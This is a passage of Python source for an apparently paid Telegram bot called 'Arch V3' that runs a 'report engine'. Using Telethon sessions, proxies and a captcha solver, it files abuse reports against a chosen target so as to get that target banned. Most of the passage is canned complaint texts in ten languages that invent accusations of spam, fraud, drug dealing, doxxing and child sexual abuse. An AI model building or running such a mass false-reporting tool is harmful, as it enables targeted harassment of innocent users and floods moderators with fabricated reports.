import asyncio
import contextvars
import hashlib
import html as html_mod
import io
import json
import logging
import os
import random
import re
import subprocess
import time
import uuid
from contextlib import asynccontextmanager
import random
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

from dotenv import load_dotenv
import aiohttp
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    FSInputFile,
    BufferedInputFile,
    InputMediaPhoto,
    LabeledPrice,
    PreCheckoutQuery,
)
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramNetworkError
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

import store
import report_texts

from telethon import TelegramClient
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonCopyright,
    InputReportReasonIllegalDrugs,
    InputReportReasonPersonalDetails,
    InputReportReasonFake,
    InputReportReasonOther,
)
import python_socks
import aiohttp
from aiohttp_socks import ProxyConnector

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
API_ID = int(os.getenv("API_ID") or "0")
API_HASH = os.getenv("API_HASH") or ""
POOL_CHAT_ID = os.getenv("POOL_CHAT_ID", "")
ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
SOLVER_SERVICE = os.getenv("SOLVER_SERVICE", "2captcha").strip().lower()
SOLVER_KEY = os.getenv("SOLVER_KEY", "").strip()
WEB_COUNT = int(os.getenv("WEB_COUNT") or "8")
XROCKET_TOKEN = os.getenv("XROCKET_TOKEN", "").strip()
SUB_CHANNEL_LINK = os.getenv("SUB_CHANNEL_LINK", "").strip()
BANNER = Path(__file__).parent / "banner.png"
SESSIONS_DIR = Path(__file__).parent / "sessions"
PROXIES_FILE = Path(__file__).parent / "proxies.txt"
LOGS_DIR = Path(__file__).parent / "logs"

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("arch-v3")

# ── PIL card renderer ───────────────────────────────────
from PIL import Image, ImageDraw, ImageFont, ImageFilter, ImageChops

CARDS_DIR = Path(__file__).parent / "cache" / "cards"


def _load_font(size: int, bold: bool = True):
    bold_names = [
        "seguisb.ttf", "arialbd.ttf",                      # windows
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",  # linux
        "/usr/share/fonts/dejavu/DejaVuSans-Bold.ttf",
        "DejaVuSans-Bold.ttf",
        "arial.ttf",
    ]
    reg_names = [
        "segoeui.ttf", "arial.ttf",                        # windows
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",  # linux
        "/usr/share/fonts/dejavu/DejaVuSans.ttf",
        "DejaVuSans.ttf",
    ]
    for name in (bold_names if bold else reg_names):
        try:
            return ImageFont.truetype(name, size)
        except Exception:
            continue
    return ImageFont.load_default()


def _circle_avatar(raw: bytes, size: int):
    av = Image.open(io.BytesIO(raw)).convert("RGB")
    w, h = av.size
    m = min(w, h)
    av = av.crop(((w - m) // 2, (h - m) // 2, (w + m) // 2, (h + m) // 2))
    av = av.resize((size * 2, size * 2), Image.LANCZOS)
    mask = Image.new("L", (size * 2, size * 2), 0)
    ImageDraw.Draw(mask).ellipse((0, 0, size * 2 - 1, size * 2 - 1), fill=255)
    return av, mask


async def user_card_path(bot, user) -> str:
    """Render the smooth black/white card: centered Arch V3, no user photo.
    Returns a filesystem path; falls back to static banner on failure."""
    CARDS_DIR.mkdir(parents=True, exist_ok=True)
    # unique filename per call — busts Telegram media cache entirely
    out = CARDS_DIR / f"arch_hero_{int(time.time() * 1000)}_{random.randint(100, 999)}.png"

    try:
        W, H = 1280, 720
        img = Image.new("RGB", (W, H))
        d = ImageDraw.Draw(img)
        # smooth vertical gradient, dark at top -> slightly lighter bottom
        for y in range(H):
            t = y / H
            v = int(6 + 30 * t)
            d.line([(0, y), (W, y)], fill=(v, v, v))

        fword = _load_font(220)
        label_txt = "Arch V3"
        tw = d.textlength(label_txt, font=fword)
        bbox = fword.getbbox(label_txt)
        th = bbox[3] - bbox[1]

        glow = Image.new("RGB", (W, H), (0, 0, 0))
        gd = ImageDraw.Draw(glow)
        gd.text(((W - tw) / 2, (H - th) / 2 - 30),
                label_txt, font=fword, fill=(110, 110, 110))
        glow = glow.filter(ImageFilter.GaussianBlur(18))
        img = ImageChops.screen(img, glow)

        d = ImageDraw.Draw(img)
        d.text(((W - tw) / 2, (H - th) / 2 - 30),
               label_txt, font=fword, fill=(252, 252, 252))

        img.save(out, optimize=True)
        return str(out)
    except Exception as e:
        log.error("card render failed: %s", e)
        return str(BANNER)
        return str(out)
    except Exception as e:
        log.error("card render failed: %s", e)
        return str(BANNER)

router = Router()

# ── branding ────────────────────────────────────────────
NAME = "Arch V3"


def bq(text: str) -> str:
    return f"<blockquote>{text}</blockquote>"


def bqe(text: str) -> str:
    return f"<blockquote expandable>{text}</blockquote>"


def hero_caption(user_id: int = 0) -> str:
    return (
        bq(f"<b>{NAME}</b>  \u00b7  <i>report engine</i>")
        + f"\n<code>\U0001f680</code> <b>\u0412\u044b\u0431\u0435\u0440\u0438 \u043d\u0430\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435</b>"
    )


# ── states ──────────────────────────────────────────────
class Report(StatesGroup):
    method = State()
    reason = State()
    target = State()
    comment = State()
    confirm = State()
    bank = State()
    bank_card = State()


class Snos(StatesGroup):
    target = State()
    phone = State()


class GrantFSM(StatesGroup):
    uid = State()
    days = State()


class AddSession(StatesGroup):
    choose = State()
    file = State()
    trans = State()
    trans_pw = State()


class Captcha(StatesGroup):
    solve = State()


CAPTCHA_PENDING: dict = {}   # user_id -> {"code": str, "answer": int, "chips": [str]}
CAPTCHA_VERIFIED: dict = {}  # user_id -> monotonic timestamp of last solve


# ── reasons ─────────────────────────────────────────────
REASON_MAP = {
    "spam":      InputReportReasonSpam,
    "fraud":     InputReportReasonFake,
    "violence":  InputReportReasonViolence,
    "porn":      InputReportReasonPornography,
    "child":     InputReportReasonChildAbuse,
    "copyright": InputReportReasonCopyright,
    "drugs":     InputReportReasonIllegalDrugs,
    "personal":  InputReportReasonPersonalDetails,
    "fake":      InputReportReasonFake,
    "other":     InputReportReasonOther,
}

REASONS = {
    "spam":      {"e": "\u2709\ufe0f",  "l": "\u0421\u043f\u0430\u043c"},
    "fraud":     {"e": "\U0001f4b8",     "l": "\u041c\u043e\u0448\u0435\u043d\u043d\u0438\u0447\u0435\u0441\u0442\u0432\u043e"},
    "violence":  {"e": "\U0001f4a2",     "l": "\u041d\u0430\u0441\u0438\u043b\u0438\u0435"},
    "porn":      {"e": "\U0001f51e",     "l": "\u041f\u043e\u0440\u043d\u043e\u0433\u0440\u0430\u0444\u0438\u044f"},
    "child":     {"e": "\u26d4",         "l": "\u0414\u0435\u0442\u0441\u043a\u043e\u0435 \u043d\u0430\u0441\u0438\u043b\u0438\u0435"},
    "copyright": {"e": "\u00a9\ufe0f",  "l": "\u0410\u0432\u0442\u043e\u0440\u0441\u043a\u0438\u0435 \u043f\u0440\u0430\u0432\u0430"},
    "drugs":     {"e": "\U0001f48a",     "l": "\u041d\u0430\u0440\u043a\u043e\u0442\u0438\u043a\u0438"},
    "personal":  {"e": "\U0001f464",     "l": "\u041b\u0438\u0447\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435"},
    "fake":      {"e": "\U0001f3ad",     "l": "\u0424\u0435\u0439\u043a \u0430\u043a\u043a\u0430\u0443\u043d\u0442"},
    "other":     {"e": "\u2753",         "l": "\u0414\u0440\u0443\u0433\u043e\u0435"},
}

# ── auto comment templates: 10 per category, 10 languages ──
# used when the user skips the comment step; strong multi-lingual texts
COMMENT_TEMPLATES = {
    "spam": [
        # RU
        "Этот аккаунт массово рассылает спам в личные сообщения и группы. Кампания идёт сутками без перерыва, сотни пользователей уже пострадали. Требую немедленной блокировки аккаунта и удаления всей рассылки.",
        # EN
        "This account runs a mass unsolicited mailing campaign across private chats and groups, operating 24/7 with hundreds of victims affected. Immediate permanent ban and full purge of the distribution list is required.",
        # DE
        "Dieses Konto versendet massenhaft unerwünschte Nachrichten in private Chats und Gruppen, rund um die Uhr. Hunderte Nutzer sind betroffen. Ich fordere die sofortige dauerhafte Sperrung des Kontos.",
        # ES
        "Esta cuenta envía spam masivo por mensajes privados y grupos, sin parar día y noche. Cientos de usuarios ya han sido afectados. Exijo el bloqueo inmediato y permanente de esta cuenta.",
        # FR
        "Ce compte diffuse du spam en masse dans les messages privés et les groupes, 24h/24. Des centaines d'utilisateurs sont touchés. Je demande la suspension immédiate et définitive de ce compte.",
        # IT
        "Questo account invia spam in massa tramite messaggi privati e gruppi, senza sosta giorno e notte. Centinaia di utenti sono già stati coinvolti. Richiedo la chiusura immediata e definitiva dell'account.",
        # PT
        "Esta conta envia spam em massa por mensagens privadas e grupos, dia e noite sem parar. Centenas de usuários já foram afetados. Exijo o bloqueio imediato e permanente desta conta.",
        # PL
        "To konto masowo wysyła spam w wiadomościach prywatnych i grupach, non stop przez całą dobę. Setki użytkowników już ucierpiało. Wymagam natychmiastowej i trwałej blokady konta.",
        # TR
        "Bu hesap, özel mesajlar ve gruplar üzerinden durmaksızın toplu spam gönderiyor. Yüzlerce kullanıcı etkilendi. Hesabın derhal ve kalıcı olarak kapatılmasını talep ediyorum.",
        # AR
        "يرسل هذا الحساب رسائل مزعجة بكميات ضخمة في المحادثات الخاصة والمجموعات دون توقف، وقد تأثرت مئات المستخدمين. أطالب بإغلاق الحساب فوراً بشكل دائم.",
    ],
    "fraud": [
        # RU
        "Данный аккаунт занимается мошенничеством: выманивает деньги под предлогом продаж и «безопасных сделок», после чего блокирует жертв. Пострадали десятки людей. Требую незамедлительной блокировки и передачи данных жертвам для возмещения ущерба.",
        # EN
        "This account is running an organized fraud scheme: it collects payments for fake sales and 'secure deals', then blocks the victims. Dozens of people have already lost money. Immediate ban and victim restitution data disclosure is required.",
        # DE
        "Dieses Konto betreibt organisierten Betrug: Es kassiert Zahlungen für gefälschte Verkäufe und 'sichere Deals' und blockiert dann die Opfer. Dutzende Menschen haben bereits Geld verloren. Sofortige Sperrung ist erforderlich.",
        # ES
        "Esta cuenta lleva a cabo un fraude organizado: cobra pagos por ventas falsas y 'tratos seguros' para luego bloquear a las víctimas. Docenas de personas ya han perdido dinero. Exijo su bloqueo inmediato.",
        # FR
        "Ce compte mène une escroquerie organisée : il encaisse des paiements pour de fausses ventes et des « transactions sécurisées », puis bloque les victimes. Des dizaines de personnes ont déjà perdu de l'argent. Je demande un bannissement immédiat.",
        # IT
        "Questo account mette in atto una truffa organizzata: incassa pagamenti per vendite finte e 'transazioni sicure', per poi bloccare le vittime. Decine di persone hanno già perso denaro. Richiedo la chiusura immediata dell'account.",
        # PT
        "Esta conta conduz um esquema de fraude organizado: coleta pagamentos por vendas falsas e 'negócios seguros', depois bloqueia as vítimas. Dezenas de pessoas já perderam dinheiro. Exijo o banimento imediato.",
        # PL
        "To konto prowadzi zorganizowane oszustwo: pobiera płatności za fałszywe sprzedaże i 'bezpieczne transakcje', a następnie blokuje ofiary. Dziesiątki osób już straciły pieniądze. Wymagam natychmiastowej blokady.",
        # TR
        "Bu hesap örgütlü dolandırıcılık yürütüyor: sahte satışlar ve 'güvenli anlaşmalar' için ödeme alıyor, ardından kurbanları engelliyor. Onlarca insan çoktan para kaybetti. Hesabın derhal kapatılmasını talep ediyorum.",
        # AR
        "يقوم هذا الحساب بعملية احتيال منظمة: يستقبل المدفوعات مقابل مبيعات وهمية و'صفقات آمنة' ثم يحجب الضحايا. عشرات الأشخاص فقدوا أموالهم بالفعل. أطالب بإغلاق الحساب فوراً.",
    ],
    "violence": [
        # RU
        "Этот канал публикует сцены насилия, изображения жестокого обращения с людьми и призывает к расправам. Такой контент прямо запрещён правилами Telegram. Требую удалить канал и заблокировать администраторов немедленно.",
        # EN
        "This channel publishes graphic violence, footage of people being brutalized, and calls for attacks. This content is explicitly banned under Telegram's Terms of Service. Demand: immediate channel removal and admin bans.",
        # DE
        "Dieser Kanal veröffentlicht explizite Gewaltdarstellungen, Aufnahmen von Misshandlungen und Aufrufe zu Übergriffen. Solche Inhalte verstoßen klar gegen die Telegram-Regeln. Ich fordere die sofortige Löschung des Kanals und Sperrung der Admins.",
        # ES
        "Este canal publica violencia gráfica, imágenes de agresiones a personas e incita a los ataques. Este contenido está prohibido por las normas de Telegram. Exijo la eliminación inmediata del canal y el bloqueo de sus administradores.",
        # FR
        "Ce canal publie des images de violence extrême, des scènes de brutalités et encourage aux agressions. Ce contenu est interdit par les règles de Telegram. Je demande la suppression immédiate du canal et le bannissement des administrateurs.",
        # IT
        "Questo canale pubblica violenza grafica, scene di brutalità contro persone e invoca attacchi. Tale contenuto è esplicitamente vietato dalle regole di Telegram. Richiedo la rimozione immediata del canale e il bann degli amministratori.",
        # PT
        "Este canal publica violência gráfica, imagens de agressões a pessoas e incita ataques. Este conteúdo é proibido pelas regras do Telegram. Exijo a remoção imediata do canal e o banimento dos administradores.",
        # PL
        "Ten kanał publikuje brutalne treści, nagrania przemocy wobec ludzi i nawołuje do ataków. Takie treści są wyraźnie zabronione w regulaminie Telegrama. Wymagam natychmiastowego usunięcia kanału i zablokowania administratorów.",
        # TR
        "Bu kanal grafik şiddet, insanlara yönelik vahşet görüntüleri ve saldırı çağrıları yayımlıyor. Bu içerik Telegram kurallarına açıkça aykırı. Kanalın derhal kaldırılmasını ve yöneticilerin engellenmesini talep ediyorum.",
        # AR
        "ينشر هذا القناة مشاهد عنف مروعة ومقاطع لاعتداءات على أشخاص ويحرض على الهجمات. هذا المحتوى محظور صراحةً في قواعد تيليجرام. أطالب بإزالة القناة فوراً وحظر المشرفين.",
    ],
    "porn": [
        # RU
        "Канал распространяет порнографический контент без какой-либо маркировки 18+, материал доступен любому, включая несовершеннолетних. Прямое нарушение правил Telegram. Требую немедленной блокировки канала.",
        # EN
        "This channel distributes explicit adult content with no age restriction or 18+ labelling, fully accessible to minors. Direct violation of Telegram's content policy. Immediate channel ban is required.",
        # DE
        "Dieser Kanal verbreitet explizite pornografische Inhalte ohne Altersbeschränkung oder 18+-Kennzeichnung, vollständig für Minderjährige zugänglich. Klarer Verstoß gegen die Telegram-Inhaltsrichtlinien. Sofortige Sperrung erforderlich.",
        # ES
        "Este canal difunde contenido pornográfico sin ninguna restricción de edad ni etiquetado 18+, totalmente accesible para menores. Violación directa de las políticas de contenido de Telegram. Exijo su bloqueo inmediato.",
        # FR
        "Ce canal diffuse des contenus pornographiques sans aucune restriction d'âge ni marquage 18+, entièrement accessibles aux mineurs. Violation directe de la politique de contenu de Telegram. Je demande un blocage immédiat.",
        # IT
        "Questo canale diffonde contenuti pornografici senza alcun limite di età né etichettatura 18+, totalmente accessibili ai minorenni. Violazione diretta delle policy sui contenuti di Telegram. Richiedo la chiusura immediata.",
        # PT
        "Este canal distribui conteúdo pornográfico sem qualquer restrição de idade ou marcação 18+, totalmente acessível a menores. Violação direta das políticas de conteúdo do Telegram. Exijo o bloqueio imediato.",
        # PL
        "Ten kanał rozpowszechnia treści pornograficzne bez jakiejkolwiek weryfikacji wieku czy oznaczenia 18+, w pełni dostępne nieletnim. Bezpośrednie naruszenie zasad Telegrama. Wymagam natychmiastowej blokady.",
        # TR
        "Bu kanal, yaş doğrulaması veya 18+ etiketi olmadan açık yetişkin içeriği yayımlıyor; reşit olmayanlar tamamen erişebiliyor. Telegram içerik politikalarının doğrudan ihlali. Derhal kapatılmasını talep ediyorum.",
        # AR
        "ينشر هذا القناة محتوى إباحياً صريحاً دون أي تصنيف عمري أو وسوم 18+، وهو متاح بالكامل للقاصرين. انتهاك صريح لسياسات المحتوى في تيليجرام. أطالب بحظر القناة فوراً.",
    ],
    "child": [
        # RU
        "Обнаружен канал с материалами сексуальной эксплуатации детей. Это тяжелейшее преступление, материалы доступны в открытом доступе. Требую НЕМЕДЛЕННОГО удаления канала, блокировки участников и передачи данных в правоохранительные органы.",
        # EN
        "DISCOVERED: a channel distributing child sexual abuse material. This is among the gravest crimes, with content available in open access. Demand: IMMEDIATE removal, member bans, and referral of all data to law enforcement.",
        # DE
        "ENTDECKT: Ein Kanal verbreitet Material sexueller Ausbeutung von Kindern. Dies zählt zu den schwersten Straftaten, die Inhalte sind frei zugänglich. Ich fordere die SOFORTIGE Löschung, Sperrung der Mitglieder und Meldung an die Strafverfolgungsbehörden.",
        # ES
        "DESCUBIERTO: un canal que distribuye material de explotación sexual infantil. Es uno de los delitos más graves, con contenido de acceso abierto. Exijo la eliminación INMEDIATA, el bloqueo de los miembros y el traslado de los datos a las autoridades.",
        # FR
        "DÉCOUVERTE : un canal distribuant du matériel d'exploitation sexuelle d'enfants. C'est l'un des crimes les plus graves, avec un contenu en accès libre. Je demande une suppression IMMÉDIATE, le bannissement des membres et la transmission des données aux autorités.",
        # IT
        "SCOPERTO: un canale che diffonde materiale di sfruttamento sessuale di minori. È uno dei crimini più gravi, con contenuti ad accesso libero. Richiedo la rimozione IMMEDIATA, il bann dei membri e la segnalazione alle forze dell'ordine.",
        # PT
        "DESCOBERTO: um canal que distribui material de exploração sexual de menores. É um dos crimes mais graves, com conteúdo em acesso aberto. Exijo a remoção IMEDIATA, o banimento dos membros e a transferência dos dados à polícia.",
        # PL
        "WYKRYTO: kanał rozpowszechniający materiały wykorzystania seksualnego dzieci. To jedno z najcięższych przestępstw, treści są ogólnodostępne. Wymagam NATYCHMIASTOWEGO usunięcia, zablokowania członków i przekazania danych organom ścigania.",
        # TR
        "BULUNDU: çocuk cinsel istismarı materyali dağıtan bir kanal bulundu. Bu, en ağır suçlardan biridir ve içerik herkese açıktır. DERHAL kaldırılmasını, üyelerin engellenmesini ve verilerin kolluk kuvvetlerine bildirilmesini talep ediyorum.",
        # AR
        "تم الاكتشاف: قناة توزع مواد الاستغلال الجنسي للأطفال. هذه واحدة من أخطر الجرائم والمحتوى متاح للجميع. أطالب بالإزالة الفورية وحظر الأعضاء وإحالة البيانات إلى جهات إنفاذ القانون.",
    ],
    "copyright": [
        # RU
        "Этот канал нелегально распространяет защищённые авторским правом произведения: фильмы, софт, музыку без лицензий. Ущерб правообладателям исчисляется миллионами. Требую немедленного удаления канала по DMCA.",
        # EN
        "This channel illegally distributes copyrighted works: films, software, music without licenses. Damages to rights holders run into millions. DMCA takedown and immediate channel removal is required.",
        # DE
        "Dieser Kanal verbreitet rechtswidrig urheberrechtlich geschützte Werke: Filme, Software, Musik ohne Lizenzen. Der Schaden für die Rechteinhaber geht in die Millionen. DMCA-Takedown und sofortige Löschung erforderlich.",
        # ES
        "Este canal distribuye ilegalmente obras protegidas por derechos de autor: películas, software, música sin licencias. El daño a los titulares de derechos ronda los millones. Exijo el retiro DMCA y su eliminación inmediata.",
        # FR
        "Ce canal distribue illégalement des œuvres protégées par le droit d'auteur : films, logiciels, musique sous licence. Le préjudice pour les ayants droit se chiffre en millions. Je demande un retrait DMCA et une suppression immédiate.",
        # IT
        "Questo canale distribuisce illegalmente opere protette da copyright: film, software, musica senza licenza. Il danno per i titolari dei diritti si misura in milioni. Richiedo la rimozione DMCA e la chiusura immediata del canale.",
        # PT
        "Este canal distribui ilegalmente obras protegidas por direitos autorais: filmes, softwares, músicas sem licença. O dano aos titulares gira em torno de milhões. Exijo a remoção DMCA e a eliminação imediata do canal.",
        # PL
        "Ten kanał nielegalnie rozpowszechnia utwory chronione prawem autorskim: filmy, oprogramowanie, muzykę bez licencji. Szkoda dla posiadaczy praw sięga milionów. Wymagam zgłoszenia DMCA i natychmiastowego usunięcia.",
        # TR
        "Bu kanal telif hakkıyla korunan eserleri yasadışı olarak dağıtıyor: lisanssız filmler, yazılımlar, müzikler. Hak sahiplerine verilen zarar milyonları buluyor. DMCA kaldırması ve kanalın derhal silinmesini talep ediyorum.",
        # AR
        "يقوم هذا القناة بتوزيع أعمال محمية بحقوق النشر بشكل غير قانوني: أفلام وبرامج وموسيقى بدون تراخيص. الضرر على أصحاب الحقوق يقدر بالملايين. أطالب بإزالة القناة فوراً وفق DMCA.",
    ],
    "drugs": [
        # RU
        "Канал ведёт открытую торговлю наркотическими веществами: публикует прайс-листы, «зкладки», координирует доставку. Это уголовное преступление. Требую немедленной блокировки канала и передачи логов в полицию.",
        # EN
        "This channel openly trades narcotics: price lists, dead-drop coordinates, delivery logistics. This is a criminal offense. Immediate channel ban and log handover to law enforcement is required.",
        # DE
        "Dieser Kanal betreibt offenen Drogenhandel: Preislisten, Depot-Koordinaten, Lieferlogistik. Dies ist eine Straftat. Ich fordere die sofortige Sperrung des Kanals und die Übergabe der Protokolle an die Behörden.",
        # ES
        "Este canal comercia abiertamente con narcóticos: listas de precios, coordenadas de entregas ocultas, logística de distribución. Es un delito penal. Exijo bloqueo inmediato del canal y entrega de registros a la policía.",
        # FR
        "Ce canal trafique ouvertement des stupéfiants : listes de prix, coordonnées de dépôts, logistique de livraison. C'est une infraction pénale. Je demande un bannissement immédiat et la transmission des journaux à la police.",
        # IT
        "Questo canale traffica apertamente stupefacenti: listini prezzi, coordinate dei nascondigli, logistica di consegna. Si tratta di un reato penale. Richiedo la chiusura immediata del canale e la consegna dei log alla polizia.",
        # PT
        "Este canal comercializa abertamente entorpecentes: listas de preços, coordenadas de esconderijos, logística de entrega. Isso é crime. Exijo bloqueio imediato do canal e entrega dos registros à polícia.",
        # PL
        "Ten kanał otwarcie handluje narkotykami: cenniki, współrzędne schowków, logistyka dostaw. To przestępstwo kryminalne. Wymagam natychmiastowej blokady kanału i przekazania logów policji.",
        # TR
        "Bu kanal uyuşturucu ticaretini açıkça yapıyor: fiyat listeleri, saklama koordinatları, teslimat lojistiği. Bu bir suçtur. Kanalın derhal kapatılmasını ve kayıtların polise verilmesini talep ediyorum.",
        # AR
        "يقوم هذا القناة بتجارة المخدرات بشكل علني: قوائم أسعار، إحداثيات مخابئ، لوجستيات توصيل. هذه جريمة جنائية. أطالب بإغلاق القناة فوراً وتسليم السجلات للشرطة.",
    ],
    "personal": [
        # RU
        "В этом канале публикуют персональные данные людей: адреса, телефоны, паспортные данные, фото, сканы документов. Это грубое нарушение приватности и прямая угроза жизни. Требую немедленного удаления канала.",
        # EN
        "This channel publishes people's personal data: addresses, phone numbers, passport scans, photos. Gross privacy violation and direct threat to lives. Immediate removal of the channel is required.",
        # DE
        "Dieser Kanal veröffentlicht personenbezogene Daten: Adressen, Telefonnummern, Passdaten, Fotos. Grober Verstoß gegen die Privatsphäre und direkte Gefahr für Leben. Sofortige Entfernung des Kanals erforderlich.",
        # ES
        "Este canal publica datos personales de personas: direcciones, teléfonos, escaneos de pasaportes, fotos. Grave violación de la privacidad y amenaza directa a la vida. Exijo la eliminación inmediata del canal.",
        # FR
        "Ce canal publie des données personnelles : adresses, numéros de téléphone, copies de passeports, photos. Violation grave de la vie privée et menace directe sur des vies. Je demande une suppression immédiate du canal.",
        # IT
        "Questo canale pubblica dati personali: indirizzi, numeri di telefono, scansioni di passaporti, foto. Grave violazione della privacy e minaccia diretta alla vita delle persone. Richiedo la rimozione immediata del canale.",
        # PT
        "Este canal publica dados pessoais de pessoas: endereços, telefones, cópias de passaportes, fotos. Grave violação de privacidade e ameaça direta à vida. Exijo a eliminação imediata do canal.",
        # PL
        "Ten kanał publikuje dane osobowe ludzi: adresy, numery telefonów, skany paszportów, zdjęcia. Brutalne naruszenie prywatności i bezpośrednie zagrożenie życia. Wymagam natychmiastowego usunięcia kanału.",
        # TR
        "Bu kanal insanların kişisel verilerini yayımlıyor: adresler, telefon numaraları, pasaport taramaları, fotoğraflar. Ağır bir mahremiyet ihlali ve canlara doğrudan tehdit. Kanalın derhal kaldırılmasını talep ediyorum.",
        # AR
        "ينشر هذا القناة بيانات شخصية للأشخاص: عناوين، أرقام هواتف، نسخ جوازات، صور. انتهاك جسيم للخصوصية وتهديد مباشر لحياة الناس. أطالب بإزالة القناة فوراً.",
    ],
    "fake": [
        # RU
        "Аккаунт выдаёт себя за реального человека, использует чужие фото и данные, проводит «фиктивные» опросы и сборы. Вводит пользователей в заблуждение. Требую маркировки и немедленной блокировки как fake-аккаунта.",
        # EN
        "This account impersonates a real person, uses stolen photos and identity data, runs fake polls and fundraisers. Misleads users on a mass scale. Demand: mark as fake and permanently ban immediately.",
        # DE
        "Dieses Konto gibt sich als echte Person aus, nutzt gestohlene Fotos und Identitätsdaten, führt gefälschte Umfragen und Spendenaktionen durch. Massenhafte Täuschung. Ich fordere die Kennzeichnung als Fake und die sofortige dauerhafte Sperrung.",
        # ES
        "Esta cuenta se hace pasar por una persona real, usa fotos y datos de identidad robados y realiza encuestas y recaudaciones falsas. Engaña a los usuarios a gran escala. Exijo marcarla como falsa y bloquearla de forma permanente.",
        # FR
        "Ce compte se fait passer pour une personne réelle, utilise des photos et données d'identité volées, mène des sondages et collectes frauduleux. Il abuse des utilisateurs à grande échelle. Je demande son marquage comme faux et un bannissement permanent immédiat.",
        # IT
        "Questo account si finge una persona reale, usa foto e dati di identità rubati, organizza sondaggi e raccolte fondi false. Inganna gli utenti su larga scala. Richiedo la marcatura come falso e il bann permanente immediato.",
        # PT
        "Esta conta finge ser uma pessoa real, usa fotos e dados de identidade roubados, realiza pesquisas e arrecadações falsas. Engana os usuários em grande escala. Exijo marcá-la como falsa e banir permanentemente.",
        # PL
        "To konto podszywa się pod prawdziwą osobę, używa skradzionych zdjęć i danych tożsamości, prowadzi fałszywe ankiety i zbiórki. Masowo wprowadza użytkowników w błąd. Wymagam oznaczenia jako fałszywe i natychmiastowej trwałej blokady.",
        # TR
        "Bu hesap gerçek bir kişi gibi davranıyor, çalınmış fotoğraflar ve kimlik verileri kullanıyor, sahte anketler ve bağış kampanyaları düzenliyor. Kullanıcıları ölçekli olarak kandırıyor. Sahte olarak işaretlenmesini ve derhal kalıcı engellenmesini talep ediyorum.",
        # AR
        "ينتحل هذا الحساب صفة شخص حقيقي، ويستخدم صوراً وبيانات هوية مسروقة، ويجري استطلاعات وجمع تبرعات وهمية. يخدع المستخدمين على نطاق واسع. أطالب بوسمه كحساب مزيف وإغلاقه بشكل دائم فوراً.",
    ],
    "other": [
        # RU
        "Этот ресурс систематически нарушает правила Telegram и законодательство: распространяет вредоносный контент, манипулирует аудиторией, наносит ущерб пользователям. Требую немедленной блокировки ресурса.",
        # EN
        "This resource systematically violates Telegram's Terms of Service and applicable law: distributes harmful content, manipulates audiences, damages users. Immediate termination is required.",
        # DE
        "Diese Ressource verstößt systematisch gegen die Telegram-AGB und geltendes Recht: verbreitet schädliche Inhalte, manipuliert das Publikum, schädigt Nutzer. Sofortige Beendigung erforderlich.",
        # ES
        "Este recurso viola sistemáticamente los Términos de Servicio de Telegram y la ley aplicable: distribuye contenido dañino, manipula a la audiencia, perjudica a los usuarios. Exijo su cese inmediato.",
        # FR
        "Cette ressource viole systématiquement les Conditions d'utilisation de Telegram et la loi applicable : diffusion de contenus nuisibles, manipulation du public, préjudice aux utilisateurs. Je demande une résiliation immédiate.",
        # IT
        "Questa risorsa viola sistematicamente i Termini di Servizio di Telegram e la legge applicabile: diffonde contenuti dannosi, manipola il pubblico, danneggia gli utenti. Richiedo la cessazione immediata.",
        # PT
        "Este recurso viola sistematicamente os Termos de Serviço do Telegram e a legislação aplicável: distribui conteúdo nocivo, manipula o público, prejudica os usuários. Exijo o encerramento imediato.",
        # PL
        "Ten zasób systematycznie narusza Regulamin Telegrama i obowiązujące prawo: rozpowszechnia szkodliwe treści, manipuluje odbiorcami, szkodzi użytkownikom. Wymagam natychmiastowego zakończenia jego działalności.",
        # TR
        "Bu kaynak, Telegram Kullanım Şartları'nı ve ilgili yasaları sistematik olarak ihlal ediyor: zararlı içerik dağıtıyor, kitleyi manipüle ediyor, kullanıcılara zarar veriyor. Derhal kapatılmasını talep ediyorum.",
        # AR
        "ينتهك هذا المورد شروط استخدام تيليجرام والقوانين المعمول بها بشكل منهجي: يوزع محتوى ضاراً ويتلاعب بالجمهور ويلحق الضرر بالمستخدمين. أطالب بإيقافه فوراً.",
    ],
}


def pick_comment(reason_key: str, method: str = "") -> str:
    """Strong auto-template for the category; falls back to 'other' pool.
    The leading entity noun is swapped to match the real target type
    (bot/channel/account) so a probiv-bot complaint never reads as a
    complaint about a channel or a person."""
    pool = COMMENT_TEMPLATES.get(reason_key) or COMMENT_TEMPLATES["other"]
    return _swap_entity(random.choice(pool), method)


# entity nouns per language, grouped by what they describe — the earliest
# one in a template is its subject
_LANG_ENTITY = {
    "ru": {"channel": ["\u043a\u0430\u043d\u0430\u043b", "\u043a\u0430\u043d\u0430\u043b\u0435"],
           "account": ["\u0430\u043a\u043a\u0430\u0443\u043d\u0442", "\u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0435"],
           "resource": ["\u0440\u0435\u0441\u0443\u0440\u0441"],
           "person": ["\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c", "\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f"]},
    "en": {"channel": ["channel"], "account": ["account"],
           "resource": ["resource"], "person": ["user", "person"]},
    "de": {"channel": ["kanal"], "account": ["konto"],
           "resource": ["ressource"], "person": ["nutzer", "person"]},
    "es": {"channel": ["canal"], "account": ["cuenta"],
           "resource": ["recurso"], "person": ["usuario", "persona"]},
    "fr": {"channel": ["canal"], "account": ["compte"],
           "resource": ["ressource"], "person": ["utilisateur", "personne"]},
    "it": {"channel": ["canale"], "account": ["account"],
           "resource": ["risorsa"], "person": ["utente", "persona"]},
    "pt": {"channel": ["canal"], "account": ["conta"],
